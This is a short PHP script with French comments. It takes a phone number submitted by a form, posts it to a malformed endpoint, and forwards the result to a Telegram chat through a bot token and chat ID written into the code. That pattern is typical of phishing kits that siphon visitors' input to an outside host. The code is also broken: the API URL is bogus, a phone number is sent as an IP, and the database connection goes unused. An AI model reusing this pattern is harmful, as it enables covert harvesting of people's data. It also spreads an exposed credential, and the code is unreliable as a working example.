<?php
// Connectez à la base de données
$servername = "localhost";
$username = "username";
$password = "password";
$dbname = "myDB";
$conn = new mysqli($servername, $username, $password, $dbname);
// Vérifiez la connexion
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
// Récupérez le numéro de téléphone
$telephone = $_POST['telephone'];
// Envoyez une requête HTTP à l'API de téléphone
$url = "https://api.ip.js/json?callback=?";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ip=$telephone");
$result = curl_exec($ch);
curl_close($ch);
// Storerez le résultat sur un bot Telegram
$botToken = "7130866739:AAHzCDivxW7B6znphCcxAuw3k6oJkbpx9YI";
$botApi = "https://api.telegram.org/bot".$botToken."/";
$data = array(
    "chat_id" => "6994578596",
    "text" => $result
);
$url = $botApi."sendMessage?".http_build_query($data);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
$result = curl_exec($ch);
curl_close($ch);
// Fermez la connexion à la base de données
$conn->close();
?>